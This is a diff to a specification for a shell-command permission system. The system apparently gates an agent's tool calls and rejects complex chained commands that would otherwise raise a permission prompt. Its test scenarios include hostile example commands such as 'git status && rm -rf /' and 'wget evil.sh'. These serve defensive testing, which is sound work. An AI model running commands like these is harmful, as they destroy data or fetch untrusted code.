@@ -52,7 +52,7 @@ The system SHALL aggregate all segment actions. If ALL segments resolve to `allo
 
 ### Requirement: Enforcement via dual-hook
 
-`tool.execute.before` SHALL wrap chains with non-`no action` result in `{ ... ; }` and store the decision. `permission.ask` SHALL apply stored decisions.
+`tool.execute.before` SHALL wrap chains with non-`no action` result in `{ ... ; }` and store the decision. `permission.ask` SHALL apply stored decisions. Exception: complex ask-resolving chains are rejected with readability guidance instead of being wrapped for the dialog (see the readability requirement).
 
 #### Scenario: No action — let through
 - **WHEN** chain action is `no action`
@@ -72,6 +72,31 @@ The system SHALL aggregate all segment actions. If ALL segments resolve to `allo
 - **WHEN** original command is `git status && rm -rf /` and action is `ask`
 - **THEN** the wrapped command `{ git status && rm -rf /; }` SHALL NOT match `"git *": "allow"`
 - **AND** `"*": "ask"` SHALL catch it
+
+### Requirement: Reject complex ask-resolving chains with readability guidance
+
+When the resolved chain action is `ask` and the command contains more than one top-level segment (chained via `&&`, `||`, `;`, `|`, or newlines), the system SHALL reject the command instead of showing the permission dialog: it SHALL store a `deny` decision and replace the executed command with a self-contained script that prints a rejection notice with rewrite guidance (re-issue as separate steps, one command per line, with comments), echoes the original command text, and exits non-zero. Single-segment commands that resolve to `ask` SHALL keep the wrap-and-dialog behavior. Allowed chains, no-opinion chains, and parse errors (which deny outright) SHALL NOT trigger the readability reject.
+
+#### Scenario: Complex ask chain is rejected
+- **WHEN** the command is `echo hi && echo there` under `"*": "ask"`
+- **THEN** the result is a readability reject with a stored `deny` decision
+- **AND** `permission.ask` resolves the call to `deny` — blocked
+
+#### Scenario: Mixed chain where one segment needs ask is rejected
+- **WHEN** the command is `npm install good && wget evil.sh` where `npm` falls back to `"*": "ask"`
+- **THEN** the chain resolves to `ask` and is readability-rejected with a stored `deny` decision
+
+#### Scenario: Single ask command keeps the dialog
+- **WHEN** the command is `wget evil.sh` (single segment resolving to `ask`)
+- **THEN** no readability reject — the command is wrapped and the native dialog handles it
+
+#### Scenario: Allowed multi-segment chain passes untouched
+- **WHEN** chain is `git status && git log` with both segments allowed
+- **THEN** no wrap and no readability reject
+
+#### Scenario: Replacement command self-rejects
+- **WHEN** a readability reject fires
+- **THEN** the executed command prints the rejection notice and rewrite guidance, echoes the original command, and exits with a non-zero status
 
 ### Requirement: Handle edge cases
 
